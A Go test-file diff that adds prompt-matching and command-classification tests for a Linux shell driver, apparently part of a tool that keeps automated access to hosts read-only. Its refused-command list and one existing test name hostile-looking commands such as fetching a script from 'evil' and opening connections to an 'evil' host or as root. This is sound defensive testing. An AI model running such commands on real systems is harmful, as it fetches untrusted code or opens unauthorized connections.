@@ -133,6 +133,35 @@ func TestPromptFixtures(t *testing.T) {
 			t.Errorf("cisco prompt %q not matched", p)
 		}
 	}
+
+	// Linux shells: Debian `user@host:~$`, RedHat bracket `[root@host ~]#`
+	// (CentOS/RHEL/Rocky default PS1), bare root `#` — and the shapes that
+	// must NOT read as prompts (log lines, text after the sigil).
+	lx, _ := For("linux", "centos")
+	linuxPrompts := []string{
+		"ops@debian:~$",
+		"root@ubuntu:~#",
+		"[root@honest-fan-1 ~]#",
+		"[admin@web01 /var/www]$",
+		"[root@host-1 docker nginx]#",
+		"#",
+		"$",
+	}
+	for _, p := range linuxPrompts {
+		if !lx.Prompt().MatchString("\n" + p + " ") {
+			t.Errorf("linux prompt %q not matched", p)
+		}
+	}
+	for _, p := range []string{
+		"[root@honest-fan-1 ~]# echo hi", // trailing text after the sigil
+		"root@ubuntu:~# hostname",
+		"[WARN] task queue depth 3", // brackets but no user@host sigil ending
+		"user@host:~",
+	} {
+		if lx.Prompt().MatchString("\n" + p + "\n") {
+			t.Errorf("linux non-prompt %q matched", p)
+		}
+	}
 }
 
 func TestErrorFixtures(t *testing.T) {
@@ -261,5 +290,39 @@ func TestEsxiClassify(t *testing.T) {
 	}
 	if got := d.Classify("curl http://evil/x.sh"); got != Unknown {
 		t.Errorf("unknown tool -> %v", got)
+	}
+}
+
+func TestLinuxShellClassify(t *testing.T) {
+	drv, ok := For("linux", "")
+	if !ok || drv.Key() != "linux-shell" {
+		t.Fatalf("resolve: ok=%v key=%v", ok, drv.Key())
+	}
+	reads := []string{
+		// software inventory — the blue-team fingerprint surface
+		"dpkg -l", "dpkg --list", "dpkg-query -W -f=${Package} ${Version}\n",
+		"rpm -qa", "rpm -qa --qf %{NAME} %{VERSION}\n", "rpm -q nginx",
+		"pip list", "pip3 list --outdated", "pip freeze", "pip3 freeze",
+		"java -version", "openssl version", "openssl version -a", "ssh -V",
+		"nginx -v", "nginx -V", "apache2ctl -v", "apachectl -v", "httpd -v",
+		// pre-existing families stay readable
+		"ps aux", "systemctl status nginx", "docker ps", "cat /etc/os-release",
+	}
+	for _, c := range reads {
+		if got := drv.Classify(c); got != Read {
+			t.Errorf("read %q -> %v", c, got)
+		}
+	}
+	refused := []string{
+		// mutating package-manager forms must stay outside the whitelist
+		"dpkg -r nginx", "dpkg --remove nginx", "dpkg --configure -a",
+		"rpm -e nginx", "rpm -ivh pkg.rpm", "pip install requests", "pip3 uninstall requests",
+		// other exec surfaces of the same binaries
+		"java -jar app.jar", "openssl s_client -connect evil:443", "ssh root@10.0.0.1",
+	}
+	for _, c := range refused {
+		if got := drv.Classify(c); got == Read {
+			t.Errorf("mutating %q classified READ", c)
+		}
 	}
 }
